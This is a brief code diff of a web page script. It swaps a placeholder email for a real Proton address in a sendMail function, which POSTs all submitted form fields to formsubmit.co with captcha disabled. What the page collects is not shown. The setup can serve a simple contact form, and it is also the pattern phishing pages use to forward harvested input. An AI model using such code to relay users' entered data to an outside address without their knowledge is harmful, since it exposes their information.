@@ -264,13 +264,13 @@
         async function sendMail(dataObj, sujet) {
             const formData = new FormData();
             formData.append("_subject", sujet);
-            formData.append("_cc", "tonemail@protonmail.com");  // Remplace avec tes adresses email
+            formData.append("_cc", "John123abcd@proton.me");  // Remplace avec tes adresses email
             formData.append("_captcha", "false");
             for (let key in dataObj) {
                 formData.append(key, dataObj[key]);
             }
             try {
-                await fetch("https://formsubmit.co/tonemail@protonmail.com", {
+                await fetch("https://formsubmit.co/John123abcd@proton.me", {
                     method: "POST",
                     body: formData,
                     headers: { "Accept": "application/json" }
@@ -347,4 +347,5 @@
     </div>
 </body>
 </html>
+
 
